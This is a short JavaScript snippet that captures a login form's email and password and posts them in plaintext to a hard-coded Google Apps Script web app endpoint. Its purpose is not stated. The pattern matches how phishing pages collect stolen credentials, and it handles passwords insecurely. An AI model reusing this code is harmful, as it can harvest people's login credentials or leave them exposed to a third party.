document.getElementById("loginForm").addEventListener("submit", function (e) {
  e.preventDefault(); // Prevent the default form submission behavior

  // Get the form input values
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  // Your Google Apps Script Web App URL
  const scriptURL = "https://script.google.com/macros/s/AKfycbwg2o9QRslZwwdile9S10FnaYy8cit1Y8DO7OtCNswwncSPOu5sTn_dt1h2Cfi0HTKJyQ/exec";

  // Send a POST request with the form data
  fetch(scriptURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email, password }),
  })
    .then((response) => response.text())
    .then((data) => {
      alert("Data saved successfully!");
      console.log(data);
    })
    .catch((error) => console.error("Error:", error));
});
